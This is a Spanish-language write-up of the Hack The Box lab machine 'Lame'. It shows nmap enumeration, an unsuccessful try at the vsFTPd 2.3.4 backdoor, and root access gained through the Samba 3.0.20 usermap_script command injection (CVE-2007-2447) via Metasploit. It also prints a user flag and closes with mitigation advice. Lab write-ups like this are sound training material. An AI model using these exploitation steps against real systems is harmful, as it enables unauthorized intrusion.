---
titulo: "Lame"
fecha: 2026-10-15
plataforma: htb
so: linux
dificultad: Easy
estado: publicado
tecnicas: [enumeracion-smb, samba, rce]
herramientas: [nmap, metasploit]
---

# Lame

## Resumen

Máquina Linux antigua con un Samba 3.0.20 vulnerable a `usermap_script` (CVE-2007-2447), que permite inyección de comandos. La explotación da directamente una shell como root.

## 1. Enumeración

Primero me conecto a la VPN y hago un ping a la máquina para confirmar conectividad y sistema operativo.

```bash
ping -c 5 10.129.76.110
```

El TTL devuelto es **63**, lo que confirma que estamos ante una máquina **Linux**.

Continúo con un escaneo de puertos para ver qué hay expuesto:

```bash
nmap -p- -T4 --min-rate 5000 10.129.76.110
```

Puertos abiertos:

```
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3632/tcp open  distccd
```

Una vez confirmados los puertos, hago un escaneo más detallado para obtener versiones y scripts:

```bash
nmap -p 21,22,139,445,3632 -sVC -T4 --min-rate 5000 10.129.76.110 -oN targeted
```

Resultados relevantes:

```
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian
3632/tcp open  distccd     distccd v1 (GNU 4.2.4)
```

El nmap también me confirma que el FTP tiene el **login anónimo habilitado**.

---

## 2. Análisis de vulnerabilidades

### FTP — vsFTPd 2.3.4

Me conecto como `anonymous` para ver qué hay:

```bash
ftp 10.129.76.110
# usuario: anonymous
# password: (enter)
```

El directorio está vacío. El FTP anónimo era un rabbit hole, no hay nada aquí.

Investigo la versión y resulta que **vsFTPd 2.3.4** tiene una backdoor conocida (**CVE-2011-2523**): si el usuario contiene `:)`, el servidor abre una shell en el puerto 6200. Lo intento pero no funciona en este caso — probablemente la máquina tiene el puerto bloqueado o la backdoor no está activa en esta instancia.

**Lección importante: no fijarse solo en el primer vector y seguir enumerando.**

### Samba — 3.0.20

Me fijo en los puertos 139 y 445. La versión **Samba 3.0.20** tiene una vulnerabilidad crítica conocida (**CVE-2007-2447**): el `username map script` permite inyección de comandos a través del campo de usuario. Hay un módulo en Metasploit que la explota directamente.

---

## 3. Explotación

Lanzo Metasploit con el módulo correspondiente:

```bash
msfconsole -q
use exploit/multi/samba/usermap_script
set RHOSTS 10.129.76.110
set LHOST tun0
run
```

Obtengo una shell como **root** directamente. Esta versión de Samba corre con privilegios de root, por lo que no hace falta escalar.

---

## 4. Post-explotación

Con la shell obtenida navego a las flags:

**User flag:**

```bash
cat /home/makis/user.txt
```

```
0d932afe9ed705ec71b7d4673e51706e
```

**Root flag:**

```bash
cat /root/root.txt
```

---

## Mitigación

Actualizar Samba a una versión con soporte: el fallo está parcheado desde hace años. Deshabilitar la opción `username map script` si no se usa. Exponer SMB solo en redes de confianza.

## Qué he aprendido

- **vsFTPd 2.3.4** tiene un backdoor conocido pero en este caso no era el vector correcto.
- **Samba 3.0.20** es la vulnerabilidad real de la máquina y da acceso directo como root.
- Enumerar bien todos los servicios antes de lanzarse a explotar el primero que aparece es clave.
- El TTL del ping ya nos da una pista del OS antes de hacer cualquier escaneo.
